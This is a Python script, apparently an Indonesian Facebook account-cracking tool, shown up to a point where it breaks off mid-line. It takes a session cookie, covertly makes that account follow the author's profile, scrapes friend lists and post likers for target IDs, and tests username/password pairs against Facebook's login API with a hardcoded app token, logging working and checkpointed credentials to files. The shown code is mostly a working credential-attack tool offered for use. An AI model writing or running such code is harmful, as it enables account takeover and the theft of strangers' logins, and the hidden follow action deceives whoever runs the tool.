#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# coded by anbia
import os
import re 
import time
import json
import random
import requests
from lib import logo
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
mbasic = 'https://mbasic.facebook.com{}'
global die,check,result, count

id = []
die = 0
chek = []
life = []
count = 0
check = 0
result = 0

g = '\x1b[1;32m'
w = '\x1b[1;37m'
b = '\x1b[1;36m'
r = '\x1b[1;31m'

def masuk():
        logo.banner()
        print('\n\n\t\t≺ \033[1;36mFACEBOOK LOGIN\033[0m ≻\n\n')
        try:
                cek = open("cookies").read()
        except FileNotFoundError:
                cek = input("[\033[1;32m>\033[0m Enter Cookie : ")
        cek = {"cookie":cek}
        ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
        if "mbasic_logout_button" in str(ismi):
                if "Apa yang Anda pikirkan sekarang" in str(ismi):
                        with open("cookies","w") as f:
                                f.write(cek["cookie"])
                else:
                        print("# Change the language, please wait!!")
                        try:
                                requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                        except:
                                pass
                try:
                        # please don't remove this or change
                        ikuti = parser(requests.get(mbasic.format("/anbia.sans"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                        ses.get(mbasic.format(ikuti),cookies=cek)
                except :
                        pass 
                return cek["cookie"]
        else:
                 exit("# cookies invalid")
def login(username,password,cek=False):
        global die,check,result,count
        b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
        params = {
                'access_token': b,
                'format': 'JSON',
                'sdk_version': '2',
                'email': username,
                'locale': 'en_US',
                'password': password,
                'sdk': 'ios',
                'generate_session_cookies': '1',
                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
        }
        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if 'EAA' in response.text:
                print(f"\r[\033[1;32mLIFE\033[0m] {username} => {password}                       ",end="")
                print()
                result += 1
                if cek:
                        life.append(username+"|"+password)
                else:
                        with open('results-life.txt','a') as f:
                                f.write(username + '|' + password + '\n')
        elif 'www.facebook.com' in response.json()['error_msg']:
                print(f"\r[\033[1;91mCHEK\033[0m] {username} => {password}                    ",end="")
                print()
                check += 1
                if cek:
                        chek.append(username+"|"+password)
                else:
                        with open('results-check.txt','a') as f:
                                f.write(username + '|' + password + '\n')
        else:
                die += 1
        for i in list('\|/-•'):
                        print(f"\r[{i}] Life : ({str(result)}) checkpoint : ({str(check)}) die : ({str(die)})",end="")
                        time.sleep(0.2)
def getid(url):
        raw = requests.get(url,cookies=kuki).content
        getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
        for x in getuser:
                if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                elif 'friends' in x:
                        continue
                else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                print('\r# ' + str(len(id)) + " retrieved",end="")
        if 'Lihat Teman Lain' in str(raw):
                getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
        return id
def fromlikes(url):
        try:
                like = requests.get(url,cookies=kuki).content
                love = re.findall('href="(/ufi.*?)"',str(like))[0]
                aws = getlike(mbasic.format(love))
                return aws
        except:
                exit("# cant dump id ")
def getlike(react):
        like = requests.get(react,cookies=kuki).content
        ids  = re.findall('class="b."><a href="(.*?)">(.*